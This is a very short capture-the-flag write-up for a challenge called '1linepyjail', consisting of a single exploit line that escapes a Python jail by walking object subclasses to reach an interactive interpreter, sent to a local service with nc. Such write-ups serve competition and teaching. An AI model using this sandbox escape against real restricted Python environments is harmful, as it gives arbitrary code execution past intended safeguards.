### 1linepyjail

Our exploit:

```
(echo "[g:=[].__class__.__base__.__subclasses__,g()[158]()(),g()[276].write.__globals__['interact']()]";cat) |nc localhost 5000
```
